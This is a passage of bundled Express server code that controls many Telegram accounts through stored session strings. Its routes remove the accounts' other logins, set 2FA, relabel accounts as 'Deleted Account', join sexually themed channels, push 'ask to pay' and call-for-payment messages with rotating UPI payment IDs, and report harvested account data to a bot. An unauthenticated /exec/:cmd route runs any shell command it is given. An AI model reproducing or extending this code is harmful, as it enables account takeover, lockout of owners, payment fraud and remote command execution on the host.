app.get('/processUsers/:limit/:skip', async (req, res, next) => {
  res.send("ok")
  next();
}, async (req, res) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));
  while (await cursor.hasNext()) {
    const document = await cursor.next();
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(document.mobile, document.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(document.mobile);
    if (cli) {
      console.log(document.mobile, " :  true");
      const lastActive = await client.getLastActiveTime();
      const date = new Date(lastActive * 1000).toISOString().split('T')[0];
      const me = await client.getMe()
      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });
      await client?.disconnect(document.mobile);
      await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)()
    } else {
      console.log(document.mobile, " :  false");
      await db.deleteUser(document);
    }
  }
  console.log("finished")
});

app.get('/refreshMap', async (req, res) => {
  checkerclass.getinstance();
  await setUserMap();
  res.send('Hello World!');
});

app.get('/clearstats2', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.clearStats2();
  res.send('Hello World!');
});

app.get('/exit', async (req, res) => {
  await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance().closeConnection();
  process.exit(1)
  res.send('Hello World!');
});

app.post('/channels', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const channels = req.body?.channels;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  channels?.forEach(async (channel) => {
    await db.insertChannel(channel);
  })
});

let settingupClient = Date.now() - 250000;
app.get('/setupClient/:clientId', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  if (Date.now() > (settingupClient + 240000)) {
    await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
    settingupClient = Date.now();
    const clientId = req.params?.clientId;
    const archieveOld = req?.query?.a;
    const days = req?.query?.d;
    const mobile = req?.query?.m;
    const formalities = req?.query?.f;
    const PLimited = !!req.query.PLimited;
    console.log(clientId, archieveOld);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=Received NEw Client Request for - ${clientId}`);
    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false, days, mobile, formalities?.toLowerCase() === 'no' ? false : true, PLimited)
  } else {
    console.log("Profile Setup Recently tried");
  }
})

app.get('/updateClient/:clientId', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  settingupClient = Date.now();
  const clientId = req.params?.clientId;
  console.log(clientId);
  await updateClient(clientId.toString())
})

app.get('/getip', (req, res) => {
  res.json(ip);
});

app.post('/contacts', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const contacts = req.body?.contacts;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  contacts?.forEach(async (contact) => {
    await db.insertContact(contact);
  })
  console.log('contacts saved', contacts.length);
});

app.post('/users', async (req, res, next) => {
  res.send('Hello World!');
  console.log(req.body);
  next();
}, async (req, res) => {
  const user = req.body;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const cli = (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
  const activeClientSetup = (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getActiveClientSetup)()
  if (activeClientSetup && activeClientSetup?.phoneNumber == user.mobile) {
    (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.setActiveClientSetup)(undefined)
    console.log("New Session Generated");
    await setNewClient(user, activeClientSetup);
    await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)(user.mobile)
  } else {
    console.log(!cli, activeClientSetup?.phoneNumber, user.mobile)
    user['lastUpdated'] = new Date().toISOString().split('T')[0]
    await db.insertUser(user);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${(0,_utils__WEBPACK_IMPORTED_MODULE_7__.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
  }
});

app.get('/channels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);
  let resp = 'joinchannel:'
  for (const channel of channels) {
    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

app.get('/activechannels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');
  let resp = 'joinchannel:'
  for (const channel of result) {

    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

let refresTime = Date.now();
app.get('/getdata', async (req, res, next) => {
  checkerclass.getinstance()
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    Array.from(userMap.values()).map(async (value) => {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}markasread`);
    })
  }
  res.setHeader('Content-Type', 'text/html');
  let resp = '<html><head></head><body>';
  resp = resp + await getData();
  resp += '</body></html>';
  resp += `<script>
              console.log("hii");
              setInterval(() => {
                window.location.reload();
              }, 20000);
          </script>`;
  res.send(resp);
});

app.get('/getdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getDemostat2`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/getAllIps', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    try {
      console.log(value.clientId)
      const res = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getip`);
      console.log(res.data);
    } catch (error) {

    }
  }
});

app.get('/refreshupis', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}refreshupis`);
  }
});

app.get('/getuserdata', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getuserstats`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/getuserdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getuserstats2`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/restartall', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  Array.from(userMap.values()).map(async (value) => {
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.deployKey}`);
  })
});
app.get('/sendtoall', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received sendtoall request');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const queries = req.query
  let newQuery = '';
  Object.keys(req.query).map((key) => {
    newQuery += `${queries[key]}/`
  });
  console.log(newQuery);
  for (const value of userMap.values()) {
    const url = `${value.url}${newQuery}`;
    console.log(url);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(url);
  }
});

app.get('/usermap', async (req, res) => {
  checkerclass.getinstance()
  console.log('Received Usermap request');
  res.json(Array.from(userMap.values()));
});

app.get('/getbufferclients', async (req, res) => {
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = []
  const clients = await db.readBufferClients({});
  clients.forEach((cli) => {
    result.push(cli.mobile);
  })
  res.json(result);
});

app.get('/clients', async (req, res) => {
  checkerclass.getinstance();
  console.log('Received Client request');
  res.json(clients)
});

app.get('/keepready2', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received keepready2 request');
  res.send(`Responding!!\nMsg = ${req.query.msg}`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg2 = ", msg);
  Array.from(userMap.values()).map(async (value) => {
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}resptopaid2?msg=${msg ? msg : "Oye..."}`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getDemostats`);
  });
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.clearStats()
});

app.get('/keepready', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received Keepready request');
  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!`)
  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;
  Array.from(userMap.values()).map(async (value) => {
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}resptopaid?msg=${msg ? msg : "Oye..."}`);
  });
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.clearStats();
  res.send(`Responding!!\nMsg = ${msg}`);
});

app.get('/asktopay', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received AsktoPay request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  Array.from(userMap.values()).map(async (value) => {
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}asktopay`)
  })
});

let callingTime = Date.now();
app.get('/calltopaid', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received Call request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  if (Date.now() > callingTime) {
    callingTime = Date.now() + (10 * 60 * 1000)
    Array.from(userMap.values()).map(async (value) => {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}calltopaid`)
    })
  }
});


app.get('/markasread', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received MarkasRead Req');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const all = req.query.all;
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    console.log("proceeding with all = ", all);
    Array.from(userMap.values()).map(async (value) => {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}markasread?${all ? "all=true" : ''}`);
    })
  }
});

app.get('/setactiveqr', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const upi = req.query.upi;
  console.log("upi = ", upi);
  Array.from(userMap.values()).map(async (value) => {
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}setactiveqr?upi=${upi}`);
  })
});

app.get('/getUpiId', async (req, res) => {
  checkerclass.getinstance();
  const app = req.query.app ? req.query.app : "paytm3"
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiId = await db.getupi(app);
  res.send(upiId);
});

app.get('/getAllUpiIds', async (req, res) => {
  checkerclass.getinstance();
  res.json(upiIds);
});

app.post('/getAllUpiIds', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiIds = await db.updateUpis(data);
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}refreshupis`);
  }
})

app.get('/getUserConfig', async (req, res) => {
  const filter = req.query
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const userConfig = await db.getUserConfig(filter);
  res.json(userConfig);
});

app.post('/getUserConfig', async (req, res) => {
  const filter = req.query
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiIds = await db.updateUserConfig(filter, data);
  await setUserMap();
  res.json(upiIds);
});


app.get('/builds', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const data = await db.getBuilds();
  console.log(data);
  res.json(data);
});

app.post('/builds', async (req, res) => {
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  console.log(data);
  const result = await db.updateBuilds(data);
  res.json(result);
});

app.get('/getAllUserClients', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const userConfig = await db.getAllUserClients();
  const resp = []
  userConfig.map((user) => {
    resp.push(user.clientId)
  })
  res.send(resp);
});

app.get('/getTgConfig', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const tgConfig = await db.getTgConfig()
  res.json(tgConfig);
});

app.get('/updateActiveChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const tgConfig = await db.updateActiveChannels();
  res.send("ok");
});

app.get('/getCurrentActiveUniqueChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.getCurrentActiveUniqueChannels();
  res.json({ length: result.length, data: result });
});

app.post('/getTgConfig', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiIds = await db.updateUpis(data)
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}refreshupis`);
  }
});

app.get('/lastpings', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/lastpingsjson', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  for (const userdata in pings) {
    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/exitglitches', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.url.toLowerCase().includes('glitch'))
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}exit`);
  }
});

app.get('/exitprimary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('1'))
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}exit`);
  }
});

app.get('/exitsecondary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('2'))
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}exit`);
  }
});

app.get('/connectclient/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (user) {
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      if (cli) {
        res.send("client created");
      } else {
        res.send("client EXPIRED");
      }
    } else {
      res.send("Client Already existing");
    }
  } else {
    res.send("User Does not exist");
  }
});

app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
  res.send("joiningChannels");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const limit = req.params.limit ? req.params.limit : 30
    const skip = req.params.skip ? req.params.skip : 20
    const k = req.query?.k
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session, false);
      if (cli) {
        const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
        const channels = await client.channelInfo(true);
        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
        console.log("DbChannelsLen: ", result.length);
        let resp = '';
        for (const channel of result) {

          resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
        }
        await client.removeOtherAuths();
        client.joinChannels(resp);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/set2fa/:number', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.set2fa();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});

app.get('/setpp/:number/:name', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const name = req.params?.name;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await _cloudinary__WEBPACK_IMPORTED_MODULE_9__.CloudinaryService.getInstance(name);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
        await client.updateProfilePic('./dp1.jpg');
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
        await client.updateProfilePic('./dp2.jpg');
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
        await client.updateProfilePic('./dp3.jpg');
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});


app.get('/updateclientasdeleted/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    let user = await db.getUser({ mobile: number });
    if (!user) {
      user = await db.getInAchivedClient({ number: `+${number}` });
      user['mobile'] = user.number
    }
    console.log(user);
    if (user && !(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        if (!(await client.hasPassword())) {
          await client.set2fa();
        }
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(30000)
        await client.updateUsername();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
        await client.updatePrivacyforDeletedAccount();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
        await client.updateProfile("Deleted Account", "Deleted Account");
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
        await client.deleteProfilePhotos();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/updatePrivacy/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updatePrivacy();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/UpdateUsername/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const username = req.query?.username;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updateUsername(username);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/UpdatePP/:number', async (req, res, next) => {
  res.send("Updating profile Pic");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updateProfilePic("./qrcode.jpg");
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/deleteChat/:number/:chatId', async (req, res, next) => {
  res.send("dleteing chat");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const chatId = req.params?.chatId;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.deleteChat(chatId);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/UpdateName/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updateProfile("Deleted Account", "Deleted Account");
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/deletepp/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.deleteProfilePhotos();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/rmbuffer/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    await db.deleteBufferClient({ mobile: number })
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/removeAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      await client.removeOtherAuths();
      res.send("Auths Removed");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/exec/:cmd', async (req, res, next) => {
  let cmd = req.params.cmd;
  console.log(`executing: `, cmd);
  try {
    res.send(console.log((0,child_process__WEBPACK_IMPORTED_MODULE_8__.execSync)(cmd).toString()));
  } catch (error) {
    console.log(error);
  }
});

app.get('/blockusers/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
